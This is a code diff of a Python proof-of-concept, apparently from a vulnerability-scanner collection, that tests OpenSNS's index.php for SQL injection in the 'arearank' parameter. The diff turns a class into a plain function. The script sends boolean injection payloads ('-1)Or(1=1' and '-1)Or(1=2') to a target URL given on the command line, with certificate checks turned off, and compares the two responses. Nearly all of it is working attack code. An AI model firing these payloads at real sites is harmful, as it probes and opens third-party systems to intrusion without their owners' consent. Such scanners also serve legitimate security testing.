@@ -9,21 +9,14 @@ description: 文件index.php中,参数arearank存在SQL注入。
 import sys
 import requests
 import warnings
-
-
-
-class index_arearank:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['opensns index.php 参数arearank注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/index.php?s=/people/index/area.html&arearank=-1)Or(1=1"
-        vulnurl = self.url + payload
-        vulnurl2 = self.url + "/index.php?s=/people/index/area.html&arearank=-1)Or(1=2"
+        vulnurl = url + payload
+        vulnurl2 = url + "/index.php?s=/people/index/area.html&arearank=-1)Or(1=2"
         try:
             req1 = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             req2 = requests.get(vulnurl2, headers=headers, timeout=10, verify=False)
@@ -39,5 +32,4 @@ class index_arearank:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = index_arearank(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
